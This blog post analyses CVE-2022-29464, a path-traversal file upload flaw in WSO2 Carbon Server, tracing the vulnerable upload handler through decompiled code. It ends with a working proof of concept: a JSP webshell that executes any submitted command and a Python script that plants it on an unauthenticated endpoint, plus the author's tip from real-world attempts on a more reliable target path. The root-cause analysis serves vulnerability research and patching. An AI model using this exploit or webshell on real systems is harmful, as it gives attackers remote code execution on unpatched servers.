---
layout: post
title:  "WSO2 Carbon Server: Pre-auth RCE bug ( CVE-2022-29464) "
date:   2022-04-22 16:00:00 +0700
categories: research
author: Quang Vo
tags: 0day, cve-2022-29464
description: Research analysis and develop a working exploit poc script 
---

## Introduction
CVE-2022-29464 is a simple and critical vulnerability reported by Orange Tsai, the vulnerability is a pre-auth abitrary file upload that allow attackers to upload JSP file to server and gain RCE. 
## Code review

### 1. Recon codebase 

Based on the security advisories, we know that the vulnerability is related to **FileUpload** function.
First, we map all unauth endpoints in the codebase:

*identity.xml*
![image](https://user-images.githubusercontent.com/37280106/164592856-ec770eff-864f-4920-afb2-623a0390d306.png)

Grepping for all the routes, url mappings so we can have a better idea of `/fileupload` endpoint is handle by which controllers:
```bash
grep -anril '<servlet-mapping>'
grep -anril '<mapping '
```

Looking through all the results that came back, one of the xml file that stand out is `carbon.xml`, the name matched what WSO2 server is called - Carbon server, which indicates us that there are some important stuffs in that xml file

*repository/conf/carbon.xml*

```xml
 <FileUploadConfig>
        <!--
           The total file upload size limit in MB
        -->
        <TotalFileSizeLimit>100</TotalFileSizeLimit>

        <Mapping>
            <Actions>
                <Action>keystore</Action>
                <Action>certificate</Action>
                <Action>*</Action>
            </Actions>
            <Class>org.wso2.carbon.ui.transports.fileupload.AnyFileUploadExecutor</Class>
        </Mapping>

        <Mapping>
            <Actions>
                <Action>jarZip</Action>
            </Actions>
            <Class>org.wso2.carbon.ui.transports.fileupload.JarZipUploadExecutor</Class>
        </Mapping>
        <Mapping>
            <Actions>
                <Action>dbs</Action>
            </Actions>
            <Class>org.wso2.carbon.ui.transports.fileupload.DBSFileUploadExecutor</Class>
        </Mapping>
        <Mapping>
            <Actions>
                <Action>tools</Action>
            </Actions>
            <Class>org.wso2.carbon.ui.transports.fileupload.ToolsFileUploadExecutor</Class>
        </Mapping>
        <Mapping>
            <Actions>
                <Action>toolsAny</Action>
            </Actions>
            <Class>org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor</Class>
        </Mapping>
    </FileUploadConfig>
```

### 2. Decompile codebase and review code

To gather all the jar files and decompile them at once, I used this simple command:
```bash
find . -type f -name "*.jar" | xargs -n 1 -P 20 -I {} mv {} wso2-decompiled/
```

This will gather all the jar files, and then move it to folder `wso2-decompiled` , then after that, we can throw them all in **IntelliJ** and let it decompile for us.

Content of module: `org.wso2.carbon.ui.transport.fileupload`

![image](https://user-images.githubusercontent.com/37280106/164597868-2806cd5f-bd56-4fc6-a2c9-86bf3a614d1f.png)

The `FileUploadServlet` with `init()` function 

![image](https://user-images.githubusercontent.com/37280106/165049405-421d5254-fc52-43ec-bbe6-b24b1e930e4a.png)

In `init()` function, `FileUploadExecutorManager` was initialized, this class is in charge of handling different types of file uploading

Later, in `/fileupload` route, it handles 2 http methods: GET & POST

![image](https://user-images.githubusercontent.com/37280106/165049949-341d892f-b8c8-405e-9c0a-a35d739ee726.png)

When a POST request is sent, `this.fileUploadExecuteManager.execute()` will be executed, content of `execute()` method:

![image](https://user-images.githubusercontent.com/37280106/165246271-8394c4a3-fb42-4be6-883b-5327b254dd87.png)

Let's walkthrough what `execute()` method do:
- Get requestURI, splits the requestURI after `fileupload/`, so any strings come after `fileupload/` is considered `actionString` 
- `actionString` is passed to `CarbonXmlFileUploadExecHandler` class along with `request` and `response`.
- After `CarbonXmlFileUploadExecHandler` was initilized, it is added to `execHandlerManager` by `execHandlerManager.addExecHandler(carbonXmlExecHandler);`
- And then `execHandlerManager.startExec()` is called 

`startExec()`  calls `execute()` of the objects was added to `execHandlerManager`, which is `CarbonXmlFileUploadExecHandler` 

![image](https://user-images.githubusercontent.com/37280106/165247678-e39a1a1e-b5fe-4311-a677-362a54203cd2.png)

`execute()` will loop through the `Hashmap` of `{"actionString": "classHandle"}` to find the corresponsding class of each `actionString`, in here, we want to invoke `toolsAny` 's handling class because **that's where our bug is ( I was manually try each actionString and review code of each action handling class  to find the bug )** , so our mapping will be:

```
toolsAny -> ToolAnyFileUploadExecutor
```

If a corresponding mapping of action class is found for the `actionString` input, `foundExecutor` variable will be set to `true` and we will get to `obj.executeGeneric()` method.

![image](https://user-images.githubusercontent.com/37280106/165249575-354e340a-dfc3-443e-95b2-4305dfdb47c8.png)


In `executeGeneric()` method, the first call to `this.parseRequest(request)` will ensures that the request's content-type is multipart form and check if the file size exceeded maximum size allowed. 

The second calls to `this.execute(request,response)` is where we need to focus to, because it will leads us to the action handling class `ToolsAnyFileUploadExecutor.execute()` 

*content of ToolsAnyFileUploadExecutor.execute()*

![image](https://user-images.githubusercontent.com/37280106/165250456-98fe64ef-2ed7-4126-a5e9-7ecc307456cb.png)

`ToolsAnyFileUploadExecutor.execute()` method writes the uploaded file to `/tmp` folder in the webserver path and stores that path to `serviceUploadDir` variable 

```java
 File uploadedFile = new File(dir, fileItem.getFileItem().getFieldName());
 FileOutputStream fileOutStream = new FileOutputStream(uploadedFile);
```

And then it appened the `fileName` of our uploaded file to `serviceUploadDir` => **This is where our Path Traversal bug lies, the web server takes untrusted user input without any sanitization**, this allowed us to escape the `/tmp` folder and write to any where that we want, hence we have `Unauth Arbitrary Write File on webserver` 

ex:
```bash
serviceUploadDir = '/tmp/extra/${time_mili}
fileName = '../../../<any_folder>

=> uploadedFile = /tmp/extra/${time_mili}/../../../<any_folder>
```

### 3. Escalate arbitrary write file to RCE 
Now that we have Unauth Arbitrary write file, the next question popped up in our mind is how do we escalate this to RCE ?. To answer this question, we have to go back to what we know about the codebase and answer a few more questions:
- What to write ?
- Where to write ? 


**What to write ?** 
![image](https://user-images.githubusercontent.com/37280106/165253235-27df731e-740a-4795-9d90-587af21190f8.png)

We know that our web application serves JSP files at `./repository/deployment/servers/...`  , so that means we can write a JSP webshell to `webapps/` folder to achieve RCE 


**Where to write ?** 

Now we need to find a folder to write to, that any user can access without any authentication needed to achieve maximum severity.

This is easy, the common thinking process will be go in the codebase and find any folder that serves JSP files like `login.jsp`, `index.jsp` because those are the landing pages of a web application, here I choose `user-portal` folder

The path to write to will be: `./repository/deployment/server/webapps/user-portal` 


## Proof-of-concept

JSP webshell:
```java
<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html> 
```

Python exploit script:

```python
from ast import arg
import requests
import argparse


def main():
    parser = argparse.ArgumentParser(description="WSO2 Carbon Server CVE-2022-29464")
    parser.add_argument("-u", help="WSO2 Carbon Server URL", required=True)
    args = parser.parse_args()
    endpoint_url = args.u
    jsp_file = open("./poc.jsp", "rb")
    resp = requests.post(f"{endpoint_url}/fileupload/toolsAny", verify=False, files={"../../../../repository/deployment/server/webapps/user-portal/cmd.jsp": jsp_file.read()})
    print (resp.status_code)
    print (resp.content)
    if resp.status_code == 200 and len(resp.content) > 0:
        print (f"Successfully exploited, webshell is hosted: {endpoint_url}/user-portal/cmd.jsp")
        exit(0)

if "__main__" == __name__:
    main()
```

*poc image* 
![image](https://user-images.githubusercontent.com/37280106/165254034-408f2e03-cf80-41e2-9f8b-ed72f5332dd1.png)

Later, after trying to exploit a few real-world application, I find out that `user-portal` endpoint is not always **accessible**, the more reliable way to exploit will be `authenticationendpoint`, if you want more certainty in your exploit payload, change the filename to : `../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp`

